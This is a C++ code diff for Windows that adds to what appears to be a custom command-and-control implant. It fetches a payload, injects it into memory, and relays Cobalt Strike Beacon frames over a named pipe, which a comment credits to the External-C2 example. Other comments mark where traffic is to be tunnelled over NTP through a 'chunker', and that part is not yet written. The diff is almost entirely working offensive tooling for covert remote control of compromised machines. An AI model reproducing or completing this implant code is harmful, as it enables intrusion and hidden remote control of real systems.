@@ -198,6 +198,66 @@ std::vector<uint8_t> getId() {
 	return extensionData;
 }
 
+
+// =====================================
+// pipe stuff
+// =====================================
+#define PAYLOAD_MAX_SIZE 512 * 1024
+#define BUFFER_MAX_SIZE 1024 * 1024
+
+DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
+	DWORD size = 0, temp = 0, total = 0;
+
+	/* read the 4-byte length */
+	ReadFile(my_handle, (char*)&size, 4, &temp, NULL);
+
+	/* read the whole thing in */
+	while (total < size) {
+		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
+		total += temp;
+	}
+
+	return size;
+}
+
+/* write a frame to a file */
+void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
+	DWORD wrote = 0;
+	WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
+	WriteFile(my_handle, buffer, length, &wrote, NULL);
+}
+
+#include <windows.h>
+void pipeStuff() {
+	//again pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c
+	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
+	while (handle_beacon == INVALID_HANDLE_VALUE) {
+		Sleep(1000);
+		handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE,
+			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
+	}
+
+	/* setup our buffer */
+	char* buffer = (char*)malloc(BUFFER_MAX_SIZE); /* 1MB should do */
+
+	/*
+	 * relay frames back and forth
+	 */
+	while (TRUE) {
+		/* read from our named pipe Beacon */
+		DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
+		if (read < 0) {
+			break;
+		}
+
+		//send back to NTP (chunker)
+		//recv from data (again from chunker)
+
+		/* write to our named pipe Beacon */
+		write_frame(handle_beacon, buffer, read);
+	}
+}
+
 int main() {
 	std::cout << "Started" << std::endl;
 
@@ -205,13 +265,21 @@ int main() {
 	std::vector<uint8_t> clientId = getId();
 
 	//1. Get Payload
+	std::cout << "[>] Getting Payload" << std::endl;
 	std::vector<uint8_t> payloadBytes = getPayload(clientId);
 
 	//2. run payload
-
+	std::cout << "[>] Injecting Payload" << std::endl;
 	injector(payloadBytes);
 
-	std::cout << "[+] Finished!" <<std::endl;
+
 	//3. read from pipe & start with chunk loop
+	std::cout << "[>] Pipe Loop Started" << std::endl;
+
+	pipeStuff();
+
+
+	std::cout << "[+] Finished!" << std::endl;
+
 
 }
